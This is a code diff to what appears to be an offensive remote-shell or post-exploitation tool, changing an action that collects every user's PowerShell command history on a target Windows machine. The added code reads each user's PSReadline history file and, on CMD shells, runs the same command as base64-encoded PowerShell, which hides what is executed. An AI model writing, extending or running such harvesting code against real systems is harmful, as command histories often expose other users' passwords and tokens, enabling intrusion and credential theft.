@@ -1,6 +1,6 @@
 # Local application/library specific imports
 from toboggan.core.action import BaseAction
-
+from toboggan.utils import methods
 
 class HistoryAction(BaseAction):
     DESCRIPTION = "Retrieve all users' shell command history"
@@ -11,10 +11,12 @@ class HistoryAction(BaseAction):
         PowerShell: PSReadline history files
         CMD: doskey history and command prompt history files
         """
+
+        powershell_command = r'foreach($user in ((ls C:\users | where-object { $_.Name -ne "Public" }).fullname)){echo "--- History of $user"; cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ea 0}'
+
         if self._os_helper.shell_type == "powershell":
-            # PowerShell one-liner
-            return self._executor.remote_execute(
-                r'foreach($user in ((ls C:\users).fullname)){echo "--- History of $user"; cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ea 0}'
-            )
- 
-        return "⚠️ CMD only stores your command history in memory for the current session."
+            command = powershell_command
+        else:
+            command = f"powershell -e {methods.base64_for_powershell(powershell_command)}"
+        
+        return self._executor.remote_execute(command)
